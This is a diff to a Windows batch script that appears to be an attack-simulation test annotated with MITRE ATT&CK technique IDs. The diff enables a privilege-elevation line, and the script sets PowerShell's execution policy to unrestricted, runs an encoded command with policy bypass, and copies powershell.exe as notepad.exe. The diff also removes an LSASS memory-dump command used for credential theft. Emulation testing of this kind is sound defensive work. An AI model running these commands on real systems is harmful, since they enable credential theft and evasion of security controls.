@@ -10,15 +10,12 @@ Echo.
 Echo.
 :: Process creates a test directory, copies powershell to that directory as notepad, the attempts to connect to a malicious URL and IP, then deletes the test directory.
 :: powershell.exe Start-Process cmd.exe -Verb runAs
-:: Echo y | powershell.exe Start-Process cmd.exe -Verb runAs
+Echo y | powershell.exe Start-Process cmd.exe -Verb runAs
 :: Escalates privileges without prompt (TA0002: Execution, TA0005: Evasion, T1059: Powershell)
 powershell.exe Set-ExecutionPolicy Unrestricted
 :: mkdir c:\test
 Echo y | powershell.exe -exec bypass -enc bQBrAGQAaQByACAAYwA6AFwAdABlAHMAdAA= 
 :: Creates a test directory on the local C: drive
-for /f "tokens=2" %%a in ('tasklist /nh /fi "imagename eq lsass.exe"') do (
-    rundll32 C:\Windows\System32\comsvcs.dll MiniDump %%a "C:\test\lsass.dmp" full
-)
 :: copy-item -path c:\windows\system32\windowspowershell\v1.0\powershell.exe -destination c:\test\notepad.exe
 copy "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "C:\test\notepad.exe"
 :: Copies powershell.exe to the newly created test directory as a notepad application
